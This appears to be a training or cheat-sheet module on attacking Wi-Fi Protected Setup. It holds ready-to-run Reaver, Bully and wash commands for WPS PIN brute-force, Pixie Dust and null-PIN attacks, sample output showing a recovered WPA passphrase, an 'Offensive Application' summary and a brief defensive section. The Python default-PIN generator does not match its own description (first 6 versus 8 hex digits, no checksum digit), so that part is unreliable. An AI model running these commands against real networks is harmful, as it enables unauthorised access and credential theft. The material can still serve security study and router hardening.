# 05 — WPS Attack Vectors

## WPS Overview

Wi-Fi Protected Setup (WPS) allows devices to connect via PIN or push-button. The PIN method uses an 8-digit number. The last digit is a checksum, so only 7 digits need brute-forcing. WPS 1.0 has no rate limiting; WPS 2.0 added lockout after failed attempts.

## Tool: Reaver

```bash
# Basic WPS PIN attack
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv

# With options
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv -K 1 -d 2 -t 5 -r 3:15
# -K 1: Pixie Dust attack
# -d 2: 2 second delay between attempts
# -t 5: 5 second timeout per attempt
# -r 3:15: Rest 15 seconds every 3 attempts

# Expected output:
# [+] Waiting for beacon from 00:11:22:33:44:55
# [+] Received beacon from 00:11:22:33:44:55
# [+] Associated with 00:11:22:33:44:55 (ESSID: HomeNetwork)
# [+] Trying pin 12345670
# [+] Sending EAPOL START request
# [+] Received identity request
```

## Tool: Bully

```bash
# Faster WPS attack with Pixie Dust
bully -b 00:11:22:33:44:55 -c 6 -i wlan0mon -v 3

# Brute-force mode without Pixie
bully -b 00:11:22:33:44:55 -c 6 -i wlan0mon -B -v 3
# -B: Brute-force mode (no Pixie)
```

## Pixie Dust Attack

Exploits weak random number generation in some chipsets (Ralink, Realtek, Broadcom). Recovers PIN from E-Hash1 and E-Hash2 without brute-forcing.

```bash
# Reaver with Pixie Dust
reaver -i wlan0mon -b 00:11:22:33:44:55 -K 1 -vv

# If successful:
# [+] Pixie Dust attack success
# [+] WPS pin: 12345670
# [+] WPA PSK: MySecretPassword123
```

## Null PIN Attack

Some routers accept a null or empty PIN, bypassing authentication.

```bash
# Reaver with null PIN
reaver -i wlan0mon -b 00:11:22:33:44:55 -p "" -vv

# Bully null PIN
bully -b 00:11:22:33:44:55 -c 6 -i wlan0mon -p 00000000
```

## WPS Push-Button (PBC) Bypass

Some routers expose WPS PBC via UPnP or vulnerable web interfaces.

```bash
# Identify WPS PBC status
wash -i wlan0mon
# Check WPS Locked column

# If unlocked, trigger PBC and capture handshake
# Requires physical proximity or UPnP exploit on router web interface
```

## PIN Database

Common default PINs derived from MAC address (first 6 hex digits → BSSID).

```bash
# Generate PIN from BSSID
python3 -c "
bssid = '00:11:22:33:44:55'
mac = bssid.replace(':', '')
pin = int(mac[0:8], 16) % 10000000
print(f'Generated PIN: {pin:07d}')
"
```

## Offensive Application

- **Pixie Dust**: Fastest vector if router vulnerable (~minutes)
- **PIN brute-force**: 11,000 attempts maximum for 7 digits. Lockout delays extend to hours/days.
- **Null PIN**: Instant bypass on vulnerable firmware.
- **PBC hijacking**: Trigger PBC remotely, capture authentication.

## Defensive Application

- **Disable WPS entirely**: Most effective defense. Many consumer routers have WPS permanently enabled in firmware.
- **WPS lockout**: Enable after 3-5 failed attempts. Some attacks bypass lockout via timing.
- **Firmware update**: Patch Pixie Dust vulnerabilities (affected chipsets: Ralink RT3xxx, Realtek RTL8xxx, Broadcom BCM43xx).
- **WPS 2.0**: Adds lockout but still vulnerable to Pixie Dust if RNG is weak.
- **Monitor wash output**: Alert on repeated WPS probe attempts.
